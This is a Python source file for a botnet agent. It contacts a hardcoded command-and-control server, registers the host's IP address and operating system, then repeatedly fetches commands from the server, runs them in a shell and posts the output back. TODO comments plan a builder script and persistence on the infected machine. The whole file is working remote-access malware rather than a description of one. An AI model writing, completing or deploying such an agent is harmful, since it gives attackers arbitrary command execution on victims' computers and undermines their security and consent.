import requests 
import time
import socket
import json 
import platform
import subprocess

"""
TODO: Create a builder script which creates this agent script 
with specific configurations.

TODO2: Create persistence on the script itself. 
"""
# Need to have hardcoded server ip address 

# This is hardcoded, for now 
URL = 'http://localhost:5000'
FIRSTCONTACTKEY = 'firstcontactkey'


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()

        return IP 

def heartbeat():
    url = URL + '/firstcontact'

    data = {'firstcontactkey': FIRSTCONTACTKEY}

    res = requests.post(url, data=data)

    global REGISTERKEY
    json_data = json.loads(res.text)
    REGISTERKEY = json_data['registerkey']
    print(REGISTERKEY)

def register(ip, os):
    url = URL + '/register'

    data = {'registerkey': REGISTERKEY, 'ip': ip, 'os': os}

    res = requests.post(url,data=data)

    #return REGISTERKEY

def fetchexec(ip):
    url = URL + '/bot/' + ip + '/task'
    data = {'registerkey': REGISTERKEY}
    res = requests.post(url, data=data)
    json_data = json.loads(res.text)
    
    #print("[*] json_data = ", json_data)

    if 'command' not in json_data:
        return '[-] ' + str(json_data)

    else:
        command = json_data['command']
        print("[+] Command received: ", command)
        result = subprocess.check_output(command, shell=True)

        return result 




def submit_result(ip, result):
    url = URL + '/bot/' + ip + '/result'
    
    data = {'registerkey': REGISTERKEY, 'result': result}

    requests.post(url, data=data)


def main():

    if "Linux" in platform.platform():
        host_os = 'Nix'
    elif "Windows" in platform.platform():
        host_os = 'Windows'
    else:
        print("[-] Unidentifiable OS type")

    ip = get_ip()
    heartbeat()
    register(ip,host_os)

    
    while(1): 
        result = fetchexec(ip)

        # If server response that the bot doesn't have anything, just sleep.
        if isinstance(result, str) and '[-]' in result:
            print("[-] Sleeping...")
            time.sleep(10)
            continue
        
        result = result.decode('utf-8')
        print("[DEBUG] Result:", result)
        submit_result(ip, result)

        print("[+] Sleeping...")
        time.sleep(10)


if __name__ == '__main__':
    main()